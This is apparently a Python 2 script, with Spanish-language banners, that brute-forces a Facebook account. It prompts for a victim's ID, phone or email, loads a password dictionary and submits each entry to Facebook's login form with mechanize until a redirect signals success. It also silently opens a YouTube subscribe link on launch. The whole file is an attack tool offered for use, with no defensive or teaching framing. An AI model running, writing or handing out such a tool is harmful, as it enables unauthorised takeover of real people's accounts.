#!usr/bin/python

import sys
import random
import mechanize
import cookielib
import os
os.system ("clear")
TUTO = '''
\033[1;33;40m
 _____      _     __        __
|_   _|   _| |_ __\ \      / /_ _ _ __ ___ ____
  | || | | | __/ _ \ \ /\ / / _` | '__/ _ \_  /
  | || |_| | || (_) \ V  V / (_| | | |  __// /
  |_| \__,_|\__\___/ \_/\_/ \__,_|_|  \___/___|
'''
TUTO2 = '''
\033[1;36;40m
 _____              _                 _
|  ___|_ _  ___ ___| |__   ___   ___ | | __
| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
           \nFuerza Bruta

'''
TUTO3 = '''
\033[1;33;40m                                                           
        Elige uno de los diccionarios
           para realizar el ataque

1.txt       2.txt      3.txt     4.txt    5.txt
'''
TUTO4 = '''
\033[1;33;40m
        Escribe el ID, Numero de Telefono
                       o
            El correo de tu victima
'''
print TUTO
print TUTO2
print TUTO4
email = str(raw_input("\n\t Victima : "))
os.system ("clear")
print TUTO
print TUTO2
print TUTO3
archivo = str(raw_input("\n\t Diccionario : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1'
os.system ("termux-open https://www.youtube.com/channel/UCaigfZGIirT4jb-g9igyzKg?sub_confirmation=1")
def attack(password):

  try:
     sys.stdout.write("\r\t      %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
         
     
     br.form['email'] = email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log == 'https://www.facebook.com/':    
        print ("\n\n\n Exelente Password Encontrado .. !!")
        sys.exit(1)
  except KeyboardInterrupt:
        print ("\n  Cerrando el programa.. ")
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n\n\n Cerrando Programa ..\n"
       sys.exit(1)
    try:
       list = open(archivo, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print TUTO
        print TUTO2
        print(("""
\033[1;33;40m                                   
            No existe el diccionario
            Intenta con los archivos

1.txt       2.txt      3.txt     4.txt    5.txt                            
""").encode('utf-8'))
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n Cerrando Programa .."
        sys.exit(1)
    try:
 
        print TUTO
        print TUTO2
        print "\n      Atacando Cuenta : %s" % (email)
        print "\t Cargando :" , len(passwords), "passwords"
        print "\t    Espera un momento ...\n "
    except KeyboardInterrupt:
        print ("\n\n\n Cerrando Programa ..\n")
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print ("\n\n\n Cerrando Programa..\n")
        sys.exit(1)

if __name__ == '__main__':
    print TUTO
    print TUTO2
    os.system ("clear")
    check()
